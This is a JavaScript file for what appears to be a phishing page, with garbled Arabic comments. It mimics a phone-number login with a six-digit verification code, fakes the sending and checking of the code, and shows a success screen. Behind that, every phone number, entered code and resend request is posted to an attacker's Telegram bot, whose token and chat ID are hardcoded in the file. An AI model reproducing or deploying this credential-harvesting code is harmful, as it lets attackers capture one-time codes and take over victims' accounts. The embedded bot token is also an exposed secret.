// script.js
document.addEventListener('DOMContentLoaded', function() {
    // Ø¹Ù†Ø§ØµØ± DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const loginContainer = document.getElementById('loginContainer');
    const codeContainer = document.getElementById('codeContainer');
    const successContainer = document.getElementById('successContainer');
    
    const startBtn = document.getElementById('startBtn');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const backBtn = document.getElementById('backBtn');
    const resendBtn = document.getElementById('resendBtn');
    const finishBtn = document.getElementById('finishBtn');
    
    const countryCode = document.getElementById('countryCode');
    const phoneNumber = document.getElementById('phoneNumber');
    const displayNumber = document.getElementById('displayNumber');
    
    const codeInputs = [
        document.getElementById('code1'),
        document.getElementById('code2'),
        document.getElementById('code3'),
        document.getElementById('code4'),
        document.getElementById('code5'),
        document.getElementById('code6')
    ];

    let fullPhoneNumber = '';
    let countdownTimer = null;
    let resendCountdown = 60;

    // Ø¨Ø¯Ø¡ Ø§Ù„Ø±Ø­Ù„Ø©
    startBtn.addEventListener('click', function() {
        welcomeScreen.style.display = 'none';
        loginContainer.style.display = 'block';
    });

    // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            validateCodeInput(this);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text');
            const numbersOnly = pastedData.replace(/[^0-9]/g, '').substring(0, 6);
            
            if (numbersOnly.length === 6) {
                codeInputs.forEach((input, i) => {
                    input.value = numbersOnly[i] || '';
                });
                codeInputs[5].focus();
            }
        });
    });

    // Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
    sendCodeBtn.addEventListener('click', function() {
        const phone = phoneNumber.value.trim();
        const code = countryCode.value;
        
        if (!validatePhoneNumber(phone)) {
            showInputError(phoneNumber, 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 6-10 Ø£Ø±Ù‚Ø§Ù…');
            return;
        }

        // Ø¥Ø²Ø§Ù„Ø© Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ù…ÙˆØ¬ÙˆØ¯Ø©
        clearInputError(phoneNumber);
        
        fullPhoneNumber = code + phone;
        displayNumber.textContent = fullPhoneNumber;
        
        // Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… ÙÙˆØ± Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù‚Ù…
        sendUserDataToTelegram(fullPhoneNumber);
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²
        simulateSendCode();
        
        loginContainer.style.display = 'none';
        codeContainer.style.display = 'block';
        
        // Ø¨Ø¯Ø¡ Ø¹Ø¯Ø§Ø¯ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        startResendCountdown();
    });

    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯
    verifyBtn.addEventListener('click', function() {
        const code = codeInputs.map(input => input.value).join('');
        
        if (code.length !== 6) {
            alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù…');
            return;
        }

        if (!/^\d{6}$/.test(code)) {
            alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· ÙÙŠ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚');
            return;
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
        sendVerificationCodeToTelegram(fullPhoneNumber, code);
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù†Ø§Ø¬Ø­
        simulateVerification(code);
    });

    // Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„ØªØºÙŠÙŠØ± Ø§Ù„Ø±Ù‚Ù…
    backBtn.addEventListener('click', function() {
        codeContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        resetCodeInputs();
        if (countdownTimer) {
            clearInterval(countdownTimer);
            countdownTimer = null;
        }
        resendBtn.textContent = 'Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„';
        resendBtn.disabled = false;
    });

    // Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²
    resendBtn.addEventListener('click', function() {
        if (resendBtn.disabled) return;
        
        const phone = phoneNumber.value.trim();
        if (!phone) {
            alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø£ÙˆÙ„Ø§Ù‹');
            return;
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
        sendResendRequestToTelegram(fullPhoneNumber);
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²
        simulateResendCode();
        startResendCountdown();
    });

    // Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
    finishBtn.addEventListener('click', function() {
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„ Ø´ÙŠØ¡
        location.reload();
    });

    // ÙˆØ¸Ø§Ø¦Ù Ù…Ø³Ø§Ø¹Ø¯Ø©
    function validatePhoneNumber(phone) {
        return phone.length >= 6 && phone.length <= 10 && /^\d+$/.test(phone);
    }

    function validateCodeInput(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
    }

    function showInputError(input, message) {
        input.classList.add('input-error');
    }

    function clearInputError(input) {
        input.classList.remove('input-error');
    }

    function resetCodeInputs() {
        codeInputs.forEach(input => {
            input.value = '';
        });
    }

    function startResendCountdown() {
        resendCountdown = 60;
        resendBtn.disabled = true;
        resendBtn.textContent = `Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (${resendCountdown}s)`;
        
        countdownTimer = setInterval(() => {
            resendCountdown--;
            if (resendCountdown <= 0) {
                clearInterval(countdownTimer);
                resendBtn.disabled = false;
                resendBtn.textContent = 'Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„';
            } else {
                resendBtn.textContent = `Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (${resendCountdown}s)`;
            }
        }, 1000);
    }

    function simulateSendCode() {
        // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ£Ø®ÙŠØ± Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        sendCodeBtn.textContent = 'Ø¬Ø§Ø±Ù Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...';
        sendCodeBtn.disabled = true;
        
        setTimeout(() => {
            sendCodeBtn.textContent = 'Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚';
            sendCodeBtn.disabled = false;
        }, 2000);
    }

    function simulateResendCode() {
        resendBtn.textContent = 'Ø¬Ø§Ø±Ù Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...';
        resendBtn.disabled = true;
        
        setTimeout(() => {
            alert('ØªÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!');
        }, 1500);
    }

    function simulateVerification(code) {
        verifyBtn.textContent = 'Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚...';
        verifyBtn.disabled = true;
        
        setTimeout(() => {
            codeContainer.style.display = 'none';
            successContainer.style.display = 'block';
            
            verifyBtn.textContent = 'ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚';
            verifyBtn.disabled = false;
        }, 2000);
    }

    // ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
    function sendUserDataToTelegram(phoneNumber) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨ØªÙˆÙƒÙ† Ø¨ÙˆØªÙƒ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        const chatId = '8457242337';     // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨Ù…Ø¹Ø±Ù Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        
        const message = `ðŸ‘¤ *Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…*\n\nðŸ“± *Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:* ${phoneNumber}\nðŸ• *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-SA')}\nðŸ“ *Ø§Ù„Ù…Ø±Ø­Ù„Ø©:* ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ\nðŸ“Š *Ø§Ù„Ø­Ø§Ù„Ø©:* ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…');
                // ÙŠÙ…ÙƒÙ†Ùƒ Ø¥Ø¶Ø§ÙØ© Ù…Ø¹Ø§Ù„Ø¬Ø© Ø®Ø·Ø£ Ù‡Ù†Ø§
            }
        })
        .catch(error => {
            console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:', error);
        });
    }

    function sendVerificationCodeToTelegram(phoneNumber, code) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨ØªÙˆÙƒÙ† Ø¨ÙˆØªÙƒ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        const chatId = '8457242337';     // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨Ù…Ø¹Ø±Ù Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        
        const message = `ðŸ” *Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚*\n\nðŸ“± *Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:* ${phoneNumber}\nðŸ”¢ *Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚:* ${code}\nðŸ• *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-SA')}\nâœ… *Ø§Ù„Ø­Ø§Ù„Ø©:* ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­\nðŸ›¡ï¸ *Ø§Ù„Ù…Ø±Ø­Ù„Ø©:* Ø§Ù„ØªÙˆØ«ÙŠÙ‚ Ù…ÙƒØªÙ…Ù„`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…');
            }
        })
        .catch(error => {
            console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚:', error);
        });
    }

    function sendResendRequestToTelegram(phoneNumber) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨ØªÙˆÙƒÙ† Ø¨ÙˆØªÙƒ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        const chatId = '8457242337';     // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨Ù…Ø¹Ø±Ù Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        
        const message = `ðŸ”„ *Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„*\n\nðŸ“± *Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:* ${phoneNumber}\nðŸ• *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-SA')}\nðŸ“¤ *Ø§Ù„Ø­Ø§Ù„Ø©:* ØªÙ… Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…');
            }
        })
        .catch(error => {
            console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
        });
    }

    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· ÙÙŠ Ø­Ù‚Ù„ Ø§Ù„Ù‡Ø§ØªÙ
    phoneNumber.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // Ù…Ù†Ø¹ Ø§Ù„Ù†Ø³Ø® ÙÙŠ Ø­Ù‚ÙˆÙ„ Ø§Ù„ÙƒÙˆØ¯ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
    codeInputs.forEach(input => {
        input.addEventListener('copy', function(e) {
            e.preventDefault();
        });
    });
});
